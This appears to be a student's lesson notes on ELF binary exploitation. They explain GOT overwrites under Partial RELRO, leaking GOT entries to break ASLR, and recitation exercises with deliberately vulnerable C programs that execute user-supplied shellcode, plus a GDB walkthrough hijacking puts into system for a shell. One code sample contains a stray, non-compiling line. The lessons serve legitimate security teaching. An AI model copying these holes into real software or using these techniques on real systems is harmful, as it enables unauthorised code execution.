So how does software exploitation fit into all this? In the lazy linking case, we resolve the function during execution and write the address to the GOT. For that reason, the GOT page in memory _must_ be readable and writeable.
- Lazy-linking means (imported) functions are resolved when the program executes, which means the .got table must be writable, which means we can exploit it

What happens if we have an arbitrary write primitive at our disposal and know the address of the GOT? 

**What would happen if we wrote an address of our choice to the GOT, say in `puts`'s GOT entry?**

The next time `puts` is called the binary will jump to the PLT and fetch the address in the GOT. _It does not do any verification of that address, and will blindly jump to it_. If we control that address, we hijack execution! This is a significant security concern, hence the introduction of absolute linking. Absolute linking forces the linker to resolve all addresses before handing execution to the binary, meaning the GOT can be changed to _read-only_ after the addresses are resolved. This protects the addresses from hijacking. We can see this in action by dumping page permissions in`gdb` for both binaries.

```console
$ gcc -o execve_shellcode execve_shellcode.c -fno-pic -no-pie
$ gcc -Wl,-z,relro -no-pie -fno-pic -o got_partial got.c
$ gdb got_partial
gef➤  b main
gef➤  r
gef➤  vmmap 0x404000
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000404000 0x0000000000405000 0x0000000000001000 rw- got_partial
gef➤  quit
$ gdb got_full
gef➤  b main
gef➤  r
gef➤  vmmap 0x555555557fc8
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555557000 0x0000555555558000 0x0000000000001000 r-- got_full
```

The protection in absolute linking is called full relocation read-only, or Full RELRO. We can easily check if the binary is susceptible to a GOT attack using `checksec`:

```console
$ pwn checksec got_partial
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ pwn checksec got_full
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We see that absolute linking corresponds to _Full RELRO_, meaning the GOT will be fully linked and read-only by the time the binary begins execution. Meanwhile the lazy-linked binary only has _Partial RELRO_ and is susceptible to the attack.

### Using Partial RELRO with Primitives

Now that we understand the Partial RELRO vulnerability, let's consider it in the context of exploitation primitives.

Normally Partial RELRO requires that the binary be no-PIE. This means we know the address of the GOT by following the instructions in the PLT stubs. With an arbitrary read we can easily leak the values in the GOT, before and/or after the table is updated. Leaking the value before a function is ever called does not help us, because the GOT is simply a pointer to another stub in the binary. But if we follow the prior instructions:

```nasm
gef➤  x/2xg 0x401020 # address in GOT
   0x401020:	push   QWORD PTR [rip+0x2fca]        # 0x403ff0
   0x401026:	jmp    QWORD PTR [rip+0x2fcc]        # 0x403ff8
gef➤  x/xg 0x403ff8
0x403ff8: 0x00007ffff7fdadc0
Start              End                Offset             Perm Path
0x00007ffff7fc7000 0x00007ffff7ff1000 0x000000000002a000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

We see that the address stored at `0x403ff8` is the address of `_dl_runtime_resolve_xsave`. Leaking this address breaks ASLR for `ld`, which could be advantageous to us.

After resolution, though, the GOT now stores a glibc address. **Leaking that value to our attacking script breaks ASLR for glibc**, which is a huge advantage! We now have the address of all functions and symbols in glibc which we can incorporate into other techniques for popping a shell, including poisoning the GOT.

We already alluded to the control gained by leveraging an arbitrary write in combination with Partial RELRO. We do not even need to wait for the function to be resolved to do the write; whenever we update the GOT address to a place of our choosing, the next function call immediately jumps to the address we specify. That is an extremely powerful tactic when combined with an arbitrary read.

> Even if a binary has Full RELRO, we can still leak a GOT entry's value to break ASLR. Even if the GOT is read-only it can still be advantageous as a building block in our attack!

## Recitation

#### Recitation 6.0

Write assembly instructions to move a pointer to the `"/bin/sh"` string into `rdi` prior to the call to `wrapper()` in [[recitation6.0]]:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"
#include "sys/mman.h"
#include "string.h"

// compile with gcc recitation6.0.c -o recitation6.0 -fno-pic -no-pie

char useful_string[] = "/bin/sh";
char command[] = "/bin/ls";

int wrapper() {
    char buf[0x40];
    int result;
    __asm__ (
        ".intel_syntax noprefix;"
        "mov rax, rsp;"
        "mov qword ptr [rax], rdi;"
        "mov qword ptr [rax + 8], 0x0;"
        "mov rsi, rsp;"
        "mov rdx, 0x0;"
        "mov rax, 0x3b;"
        "syscall;"
        ".att_syntax;"
        :"=r"(result));
        "lea rdi, [useful_string]"
    
    return result;
}

int main() {
    printf("I am going to execute %s\n", command);
    void* rwx_page = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_ANON|MAP_PRIVATE, -1, 0);
    puts("Give me some shellcode to exec!");
    int read_bytes = read(0, rwx_page, 0x1000);
    // write `push &wrapper ; ret`
    // instruction for push is 0x68 followed by 4 address bytes (in LE)
    // instruction for ret is 0xc3
    *((char*)rwx_page + read_bytes) = 0x68;
    *(int*)((char*)rwx_page + read_bytes + 1) = (int)(&wrapper);
    *((char*)rwx_page + read_bytes + 5) = 0xc3;
    void (*f)() = rwx_page;
    f();
    puts("Did you get a shell??");
    return 0;
}
```

#### Recitation 6.1

Write assembly instructions to change the value of the `key` to `0xdeadbeef` prior to the conditional check in [[recitation6.1]], which executes the following code: 

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"
#include "sys/mman.h"
#include "string.h"

// compile with gcc recitation6.1.c -o recitation6.1 -fno-pic -no-pie

int key = 0x1337c0d3;

void wrapper() {
    if (key == 0xdeadbeef) {
            puts("Here's a shell!");
            system("/bin/sh");
    }
}
// desired action: key = 0xdeadbeef
// so we send in assembly instructions to do that

int main() {
    void* rwx_page = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_ANON|MAP_PRIVATE, -1, 0);
    puts("Give me some shellcode to exec!");
    int read_bytes = read(0, rwx_page, 0x1000);
    // write `push &wrapper ; ret`
    // instruction for push is 0x68 followed by 4 address bytes (in LE)
    // instruction for ret is 0xc3
    *((char*)rwx_page + read_bytes) = 0x68;
    *(int*)((char*)rwx_page + read_bytes + 1) = (int)(&wrapper);
    *((char*)rwx_page + read_bytes + 5) = 0xc3;
    void (*f)() = rwx_page;
    f(); 
    puts("Did you get a shell??");
    return 0;
}
```

#### Recitation 6.2

Consider the following short [[recitation6.2.c]] program:

```c
#include "stdio.h"
#include "stdlib.h"

// compile with gcc -Wl,-z,relro -no-pie -fno-pic recitation6.2.c -o recitation6.2

int main() {
	puts("Nothing to see here!");
    puts("Just me printing my favorite string...");
    puts("/bin/sh");
	return 0;
}
```

Run [[recitation6.2]] in GDB and perform the following operations:
week's challenges that involve .got are NO-PIE
- that's why you can use GDB to find the absolute address, and code that into python script!!








* Break on `main` and run the program
* Find the GOT addresses for `printf` and `puts`
* Find the address of `system` in glibc
* Determine the point during execution where we would like to hijack a call to `puts` to instead call `system`
* Before that call, use GDB to set the address in `puts`'s GOT to system
* Get shell

_Hint, use GDB's `set` command with casting to set a value at an address: `set *(void**)<address> = <value>`_.

#### Recitation6.3

Try compiling [[arb_read.c]] and [[arb_write.c]] from [[5. Introduction to Binary Exploitation]] with the `-Wl,-z,relro -no-pie -fno-pic` flags. Supply different binary addresses to leak `libc`/`ld` and cause a crash by overwriting the GOT address of `puts` or `printf`.

## Next Steps

Shellcoding is a core binary exploitation skill and GOT table overwrites are a useful modern tactic for attacking ELF binaries with Partial RELRO. For further details on shellcoding and all things exploitation, the [Shellcoder's Handbook](https://www.oreilly.com/library/view/the-shellcoders-handbook/9780470080238/) is a phenomenal read. Though the content is dated, the core concepts are still very much relevant to modern exploitation.

Still, these tactics have limitations; shellcoding requires that we are able to `mmap` a new page with RWX permissions and GOT overwrites require Partial RELRO. What happens when targeting a modern program with Full RELRO? For that we need a new strategy, which we'll discuss in the next lesson.